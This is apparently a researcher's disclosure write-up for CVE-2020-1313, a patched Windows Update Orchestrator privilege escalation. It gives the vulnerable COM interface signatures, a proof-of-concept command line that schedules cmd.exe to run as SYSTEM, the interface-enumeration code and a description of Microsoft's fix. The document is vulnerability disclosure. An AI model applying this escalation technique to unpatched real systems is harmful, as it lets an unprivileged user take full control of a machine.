# CVE-2020-1313

## Abstract

Windows Update Orchestrator Service is a DCOM service used by other components to install windows updates that
are already downloaded. USO was vulnerable to Elevation of Privileges (any user to local system) due to an improper 
authorization of the callers. The vulnerability affected the Windows 10 and Windows Server Core products. 
Fixed by Microsoft on Patch Tuesday June 2020.

## The vulnerability

The `UniversalOrchestrator` service (`9C695035-48D2-4229-8B73-4C70E756E519`), implemented in `usosvc.dll` is running as `NT_AUTHORITY\SYSTEM` and is configured with access permissions for `BUILTIN\Users` (among others).
Even though enumeration of the COM classes implemented by this service is blocked (OLEView.NET: Error querying COM interfaces - ClassFactory cannot supply requested class), the
`IUniversalOrchestrator` interface (`c53f3549-0dbf-429a-8297-c812ba00742d`) - as exposed by the proxy defintion - can be obtained via standard COM API calls. The following 3 methods are exported:

```
	virtual HRESULT __stdcall HasMoratoriumPassed(wchar_t* uscheduledId, int64_t* p1);//usosvc!UniversalOrchestrator::HasMoratoriumPassed
	virtual HRESULT __stdcall ScheduleWork(wchar_t* uscheduledId, wchar_t* cmdLine, wchar_t* startArg, wchar_t* pauseArg);//usosvc!UniversalOrchestrator::ScheduleWork
	virtual HRESULT __stdcall WorkCompleted(wchar_t* uscheduledId, int64_t p1);//usosvc!UniversalOrchestrator::WorkCompleted
```

The `ScheduleWork` method can be used to schedule a command to be executed in the context of the service and can be done without any authorization of the requestor.
Though the target executable itself must be digitally signed and located under `c:\windows\system32` or common files in `Program Files`, command line arguments can be specified as well. 
This makes it possible to launch `c:\windows\system32\cmd.exe` and gain arbitrary code execution this way under `NT_AUTHORITY\SYSTEM` making this issue a local privilege escalation.

The work is "scheduled", it is not kicked off immediately.

## Proof of Concept

The PoC I created configures a "work" with cmdLine `c:\windows\system32\cmd.exe` and parameters: `/c "whoami > c:\x.txt & whoami /priv >>c:\x.txt"`

Executing it:

```
	C:\111>whoami
	desktop-43rnlku\unprivileged

	C:\111>whoami /priv

	PRIVILEGES INFORMATION
	----------------------

	Privilege Name                Description                          State
	============================= ==================================== ========
	SeShutdownPrivilege           Shut down the system                 Disabled
	SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
	SeUndockPrivilege             Remove computer from docking station Disabled
	SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
	SeTimeZonePrivilege           Change the time zone                 Disabled

	C:\111>whoami /priv

	C:\111>UniversalOrchestratorPrivEscPoc.exe
	Obtaining reference to IUniversalOrchestrator
	Scheduling work with id 56594
	Succeeded. You may verify HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Orchestrator\UScheduler to see the task has indeed been onboarded. The command itself will be executed overnight if there is no user interaction on the box or after 3 days SLA has passed.
```

An entry about the scheduled work is added to the registry:

![Registry entry](https://raw.githubusercontent.com/irsl/CVE-2020-1313/master/poc.png)

The specified command is executed overnight (around 23:20) when no user interaction is expected, or after 3 days of SLA has passed.

## How was this issue found?

When I couldn't obtain the interface definition of the USO service with [OleView.NET](https://github.com/tyranid/oleviewdotnet), I created a script to go through hundreds of CLSID/IID combinations and that I expected to work at some level. It looked something like this:

```
void TestUpdateOrchestratorInterfaceAgainstService(IID& clsId, const char* className, const wchar_t* iidStr, const char *interfaceName)
{
	void *ss = NULL;
	IID iid;
	ThrowOnError(IIDFromString(iidStr, (LPCLSID)&iid)); // working with e at the end, failing with anything else

	HRESULT res = CoCreateInstance(clsId, nullptr, CLSCTX_LOCAL_SERVER, iid, (LPVOID*)&ss);

	printf("%s %s: %s\n", className, interfaceName, res == S_OK ? "WORKING" : "failure");
}

void TestUpdateOrchestratorInterface(const wchar_t* iidStr, const char *interfaceName)
{
	// TestUpdateOrchestratorInterfaceAgainstService(CLSID_AutomaticUpdates, "AutomaticUpdates", iidStr, interfaceName); // timeouting!
	TestUpdateOrchestratorInterfaceAgainstService(CLSID_UxUpdateManager, "UxUpdateManager", iidStr, interfaceName);
	TestUpdateOrchestratorInterfaceAgainstService(CLSID_UsoService, "UsoService", iidStr, interfaceName);
	TestUpdateOrchestratorInterfaceAgainstService(CLSID_UpdateSessionOrchestrator, "UpdateSessionOrchestrator", iidStr, interfaceName);
	TestUpdateOrchestratorInterfaceAgainstService(CLSID_UniversalOrchestrator, "UniversalOrchestrator", iidStr, interfaceName);
	// TestUpdateOrchestratorInterfaceAgainstService(CLSID_SomeService, "SomeService", iidStr, interfaceName); // timeouting!
}

...

	TestUpdateOrchestratorInterface(L"{c57692f8-8f5f-47cb-9381-34329b40285a}", "IMoUsoOrchestrator");
	TestUpdateOrchestratorInterface(L"{4284202d-4dc1-4c68-a21e-5c371dd92671}", "IMoUsoUpdate");
	TestUpdateOrchestratorInterface(L"{c879dd73-4bd2-4b76-9dd8-3b96113a2130}", "IMoUsoUpdateCollection");
        // ... and hundreds of more

```

The result of the approach was:

```
	UniversalOrchestrator IUniversalOrchestrator: WORKING
	UpdateSessionOrchestrator IUpdateSessionOrchestrator: WORKING
	UxUpdateManager IUxUpdateManager: WORKING
```

Then I started reverse engineering the implementation and found the flow described above.


## The fix

Microsoft fixed this issue on Patch Tuesday June 2020 by adding the missing CoImpersonateClient API call.

Implementation before the fix applied:

![Original implementation](https://raw.githubusercontent.com/irsl/CVE-2020-1313/master/the-original-impl.png)

Implementation after the fix applied:

![The fix](https://raw.githubusercontent.com/irsl/CVE-2020-1313/master/the-fix.png)

How does this help? Impersonation is done at the beginning of processing the request, so the API calls to update the registry are executed in the caller's security context. If the caller has no privilege on HKEY_LOCAL_MACHINE, the uso API method will fail accordingly.

## Credits

[Imre Rad](https://www.linkedin.com/in/imre-rad-2358749b/)

## More info

https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1313

